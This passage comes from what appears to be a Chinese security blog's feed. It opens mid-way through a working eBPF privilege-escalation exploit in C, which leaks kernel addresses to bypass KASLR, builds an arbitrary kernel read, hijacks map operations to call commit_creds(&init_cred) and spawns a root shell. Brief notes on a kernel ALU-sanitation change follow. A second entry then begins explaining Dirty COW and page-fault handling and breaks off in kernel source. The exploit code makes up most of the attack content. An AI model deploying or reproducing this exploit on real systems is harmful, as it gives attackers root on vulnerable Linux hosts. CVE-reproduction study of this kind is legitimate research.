class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack(map_fd, map_fd2)                                              \</span></span><br><span class="line"><span class="meta">    BPF_LD_MAP_FD(BPF_REG_1, map_fd),                                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_2, BPF_REG_0, 0),                         \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_LD_MAP_FD(BPF_REG_1, map_fd2),                                   \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),                               \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_4),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_7, 0x1),                                       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_7, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 2),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_7),                        \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_8, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_3, 1, 2),                             \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0x196082),                                  \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_3),                        \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x1000),                           \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_7, BPF_REG_6),                                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, 0x1000 - 1),                       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_7),                        \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> setup_btf_bpf_prog_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_kernel</span><span class="params">(<span class="keyword">int</span> map_fd, <span class="keyword">int</span> map_fd2, <span class="keyword">uint64_t</span> addr, <span class="keyword">char</span> *buf, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> values[<span class="number">0x1500</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_ops_content</span>[] =</span></span><br><span class="line">        &#123;</span><br><span class="line">            attack(map_fd, map_fd2),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, <span class="number">0xD0</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),</span><br><span class="line">            BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_9, <span class="number">8</span>),</span><br><span class="line">            BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len / <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="keyword">sizeof</span>(values));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span> <span class="title">info</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">            .info.bpf_fd = map_fd,</span><br><span class="line">            .info.info = (<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;info,</span><br><span class="line">            .info.info_len = <span class="keyword">sizeof</span>(info)&#125;;</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)(values + <span class="number">8</span>) = addr - <span class="number">0x58</span>;</span><br><span class="line">        <span class="keyword">if</span> (addr == <span class="number">0</span>)</span><br><span class="line">            *(<span class="keyword">uint64_t</span> *)(values + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(map_fd2, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">            err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_ops_content, <span class="keyword">sizeof</span>(read_map_ops_content) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="number">1</span>, &amp;setup_btf_bpf_prog_fd))</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != obj_get_info_by_fd(&amp;attr))</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to get map info\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        addr = addr + <span class="number">4</span>;</span><br><span class="line">        ((<span class="keyword">uint32_t</span> *)buf)[i] = info.btf_id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">map_attr</span> =</span> &#123;</span><br><span class="line">        .map_type = BPF_MAP_TYPE_ARRAY,</span><br><span class="line">        .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">        .value_size = <span class="number">0x1500</span>,</span><br><span class="line">        .max_entries = <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> map_fd2 = create_map(&amp;map_attr);</span><br><span class="line">    <span class="keyword">int</span> map_fd = create_map(&amp;map_attr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (map_fd &lt; <span class="number">0</span> || map_fd2 &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, map_fd);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, map_fd2);</span><br><span class="line">        err_exit(<span class="string">&quot;Failed to create map\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *values = <span class="built_in">malloc</span>(<span class="number">0x3000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="keyword">sizeof</span>(values));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(map_fd2, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">ops</span>[] =</span></span><br><span class="line">        &#123;</span><br><span class="line">            attack(map_fd, map_fd2),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, <span class="number">0x110</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),</span><br><span class="line">            BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, <span class="number">0</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_ADD, BPF_REG_8, BPF_REG_6),</span><br><span class="line">            BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(ops, <span class="keyword">sizeof</span>(ops) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="number">2</span>, <span class="literal">NULL</span>))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != lookup_map_element(map_fd2, <span class="number">0</span>, values))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to lookup map element\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> raw_array_map_ops = <span class="number">0xffffffff820363a0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_addr;</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> array_map_ops = *(<span class="keyword">uint64_t</span> *)values;</span><br><span class="line">    kernel_offset = array_map_ops - raw_array_map_ops;</span><br><span class="line">    kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">uint64_t</span> work_for_cpu_fn_addr = kernel_offset + <span class="number">0xffffffff810bc190</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> commit_creds_addr = kernel_offset + <span class="number">0xffffffff810cce30</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> init_creds_addr = kernel_offset + <span class="number">0xffffffff82a6b880</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;array_map_ops_addr =&gt; %p\n&quot;</span>, array_map_ops);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base =&gt; %p\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_offset =&gt; %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;work_for_cpu_fn =&gt; %p\n&quot;</span>, work_for_cpu_fn_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;commit_creds_addr =&gt; %p\n&quot;</span>, commit_creds_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;init_creds_addr =&gt; %p\n&quot;</span>, init_creds_addr);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_addr_ops</span>[] =</span> &#123;</span><br><span class="line">        attack(map_fd, map_fd2),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, <span class="number">0x50</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, BPF_REG_9, BPF_REG_6),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, <span class="number">8</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_addr_ops, <span class="keyword">sizeof</span>(read_map_addr_ops) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="number">1</span>, <span class="literal">NULL</span>))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != lookup_map_element(map_fd, <span class="number">0</span>, values))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to lookup map element\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> map_ptr = *(<span class="keyword">uint64_t</span> *)(values + <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;map_ptr =&gt; %p\n&quot;</span>, map_ptr);</span><br><span class="line">    <span class="keyword">uint64_t</span> map_value = map_ptr - <span class="number">0xc0</span> + <span class="number">0x110</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;map_value =&gt; %p\n&quot;</span>, map_value);</span><br><span class="line"></span><br><span class="line">    read_kernel(map_fd, map_fd2, map_ptr, values, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, *(<span class="keyword">uint64_t</span> *)values);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    read_kernel(map_fd, map_fd2, array_map_ops, values, <span class="number">0xf0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> map_ops[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(values + <span class="number">8</span> * <span class="number">4</span>) = work_for_cpu_fn_addr;</span><br><span class="line">    <span class="built_in">memcpy</span>(map_ops, values, <span class="number">0xf0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(map_fd2, <span class="number">0</span>, map_ops, BPF_ANY))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">modify_oob_map</span>[] =</span></span><br><span class="line">        &#123;</span><br><span class="line">            attack(map_fd, map_fd2),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, <span class="number">0x110</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_SUB, BPF_REG_9, BPF_REG_6),</span><br><span class="line">            BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, <span class="number">0x8</span>),</span><br><span class="line">            BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, <span class="number">0x10</span>),</span><br><span class="line">            BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_8, <span class="number">0x18</span>),</span><br><span class="line">            BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, <span class="number">0x20</span>),</span><br><span class="line">            BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_1, <span class="number">0x28</span>),</span><br><span class="line">            BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_2, <span class="number">0</span>),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(values + <span class="number">0x8</span>) = commit_creds_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(values + <span class="number">0x10</span>) = init_creds_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(values + <span class="number">0x18</span>) = map_value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(modify_oob_map, <span class="keyword">sizeof</span>(modify_oob_map) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="number">1</span>, <span class="literal">NULL</span>))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> key = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> next_key;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = map_fd2,</span><br><span class="line">        .key = &amp;key,</span><br><span class="line">        .next_key = &amp;next_key&#125;;</span><br><span class="line">    map_get_next_key(&amp;attr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] commit_cred(&amp;init_cred) done!\n&quot;</span>);</span><br><span class="line">    get_shell();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230812203539165.png"                      alt="image-20230812203539165"                ></p><h2 id="值得注意的"><a href="#值得注意的" class="headerlink" title="值得注意的"></a>值得注意的</h2><p>在linux kernel 5.11.16版本以后的 ALU sanitation 机制发生了改变，一是<code>alu_limit</code>计算方法变了，不再用指针寄存器的位置来计算，而是使用offset寄存器。例如，假设有个寄存器的无符号边界是 <code>umax_value = 1, umin_value = 0</code>，则计算出 <code>alu_limit = 1</code>，表示如果该寄存器在运行时超出边界，则指针运算不会使用该寄存器。二是在runtime时会用立即数替换掉 <code>verifier</code> 认定为常数的寄存器。例如，<code>BPF_ALU64_REG(BPF_ADD, BPF_REG_2, EXPLOIT_REG)</code> ，<code>EXPLOIT_REG</code>被verifier认定为0，但运行时为1，则将该指令改为 <code>BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0)</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> off_is_imm = tnum_is_const(off_reg-&gt;var_off);</span><br><span class="line">alu_state |= off_is_imm ? BPF_ALU_IMMEDIATE : <span class="number">0</span>;</span><br><span class="line">isimm = aux-&gt;alu_state &amp; BPF_ALU_IMMEDIATE;</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="keyword">if</span> (isimm) &#123;</span><br><span class="line">        *patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux-&gt;alu_limit);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="comment">// Patch alu_limit check instructions</span></span><br><span class="line">         <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>参考链接:</p><p>​    <a class="link"   href="https://elixir.bootlin.com/linux/v5.11.16/source" >https://elixir.bootlin.com/linux/v5.11.16/source<i class="fas fa-external-link-alt"></i></a></p><p>​    <a class="link"   href="https://www.anquanke.com/post/id/251933#h2-1" >https://www.anquanke.com/post/id/251933#h2-1<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近为了找工作疯狂复现CVE是真的太难了😭，今天才发现我工位旁边的居然是fmyy爷😭，属于是给跪了。&lt;/p&gt;
&lt;p&gt;这次复现的这个CVE</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    <category term="CVE" scheme="https://cv196082.gitee.io/categories/kernel-pwn/CVE/"/>
    
    
    <category term="ebpf" scheme="https://cv196082.gitee.io/tags/ebpf/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-5195</title>
    <link href="https://cv196082.gitee.io/2023/08/08/CVE-2016-5195/"/>
    <id>https://cv196082.gitee.io/2023/08/08/CVE-2016-5195/</id>
    <published>2023-08-08T02:46:43.000Z</published>
    <updated>2023-08-08T02:46:06.339Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CVE-2016-5195就是非常出名的<code>Dirty COW</code>，俗称<code>脏牛漏洞</code>。攻击者可以通过Linux Kernel中的COW ( copy-on-write )机制利用条件竞争实现越权对文件读写。</p><p>此漏洞自从Linux Kernel 2.6.22版本就存在，直到2018年Linux Kernel 4.8.3, 4.7.9, 4.4.26版本才被修复。其实这一个CVE应当是一个初学者复现的第一个CVE的，但是可笑的是我是知道今年四五月份时阿里实习生二面的时候才听说过，所以被狠狠的刷了。然而作为一条懒狗我也是硬拖到现在才进行复现，然而在之前我尝试过复现一次不过因为电脑性能跑不出poc就放弃了，因为最近又要开始各种面试所以又要开始学习很多东西了。</p><h2 id="COW机制"><a href="#COW机制" class="headerlink" title="COW机制"></a>COW机制</h2><h3 id="basic-COW"><a href="#basic-COW" class="headerlink" title="basic COW"></a>basic COW</h3><p>COW 即 <code>copy on write</code>：目的是为了降低系统的开销，在一个进程通过<code>fork()</code>创建一个子进程时，并不会直接将父进程的所有地址空间的所有内容复制再分配给子进程。而实际的机制为<strong>父进程与子进程共享所有的页框，而不是直接给子进程分配新的页框，只有当其中任意一方尝试向页框写入内容时内核才会为其分配页框，并将原本内框的内容复制过去</strong>。</p><ol><li>  在<code>fork()</code>系统调用后，父子进程会共享所有的页框，内核将所有的页框定义为<code>read-only</code>。</li><li>  由于所有页框都是只读的权限，当其中任意一方尝试修改页框时便会触发缺页异常，此时内核会为其分配新的页框。</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230807101650345.png"                      alt="image-20230807101650345"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230807101734100.png"                      alt="image-20230807101734100"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230807101837765.png"                      alt="image-20230807101837765"                ></p><p>以上就是写时复制的基本流程，大大的减少了系统的开销。</p><h3 id="mmap-与-COW"><a href="#mmap-与-COW" class="headerlink" title="mmap 与 COW"></a>mmap 与 COW</h3><p>在上文中想必各位都看到了一个非常熟悉的词<code>缺页异常</code>，其实在原先的文章中我们已经遇到过了缺页异常也是常用的<code>userfaultfd</code>机制。然而当时我们创建的是<code>PROT_READ|PROT_WRITE</code>，当我们映射一个只有读权限的文件，若是我们此时向映射中写入内容时同样会触发写时复制的机制，将文件内容拷贝到内存中，此时进程对这块区域的读写便不会影响磁盘中的文件了。</p><h2 id="缺页异常-amp-write"><a href="#缺页异常-amp-write" class="headerlink" title="缺页异常&amp;write"></a>缺页异常&amp;write</h2><p>在以前写过的<code>userfaultfd</code>这一利用方法的时候并没有分析过缺页异常的原理更别提源码分析了，所以这次正好写一下。</p><p>在CPU中使用MMU进行虚拟内存和物理内存之间的映射，然而在系统中并不是所有的虚拟内存页面都有对应的物理内存页，当软件试图访问已经被映射在虚拟内存中，但是并没有被加载到物理内存中的一个分页时，MMU无法完成由虚拟内存到物理内存之间的转化，此时便会产生<strong>缺页异常</strong>。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>那么触发缺页异常主要有以下三种情况：</p><ol><li>  线性地址不在虚拟地址空间中</li><li>  线性地址在虚拟地址空间中，但是权限不够</li><li>  线性地址在虚拟地址空间中，但是没有与物理地址之间建立映射</li></ol><p>其类型主要分为以下三种：</p><ol><li><p>软性缺页异常</p><p>  软性缺页异常指的是相关页已经被载入到了内存中，但是并没有在MMU中注册，此时只需要向MMU注册相关的物理页即可。</p><p>  主要出现在以下两种情况：</p><ol><li>  两个进程共享相同的物理页框，内核为其中一个注册了物理页，但是没有为另外一个注册</li><li>  该页已经被CPU的工作集中移除，但是尚未交换到磁盘上，若是程序重新使用该页则另需向MMU注册</li></ol></li><li><p>硬性缺页异常</p><p>  硬性缺页异常则意味着使用的页并没有被载入到内存中，此时操作系统则需要讲一个合适并且空闲的物理页载入进内存中，随后向该页中写入内容，并在MMU中注册。硬性缺页异常的开销极大，因此部分操作系统也会采取延迟页载入的策略——只有到万不得已时才会分配新的物理页，这也是 Linux 内核的做法。若是频繁地发生硬性缺页异常则会引发系统颠簸，因资源耗尽而无法正常完成工作。</p></li><li><p>无效缺页异常</p><p>  意味着进程访问了一个无效的内存地址，此时kernel会向进程发送<code>SIGSEGV</code>信号。</p></li></ol><h3 id="处理缺页异常"><a href="#处理缺页异常" class="headerlink" title="处理缺页异常"></a>处理缺页异常</h3><p>针对文本的缺页异常处理的流程如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__do_page_fault() =&gt; __handle_mm_fault() =&gt; handle_pte_fault() =&gt; do_fault() =&gt; do_read_fault()/do_ww_fault()/do_shared_fault()</span><br></pre></td></tr></table></figure><p>从头往后看，首先看<code>__do_page_fault</code>函数。</p><h4 id="do-page-fault"><a href="#do-page-fault" class="headerlink" title="__do_page_fault"></a><strong>__do_page_fault</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 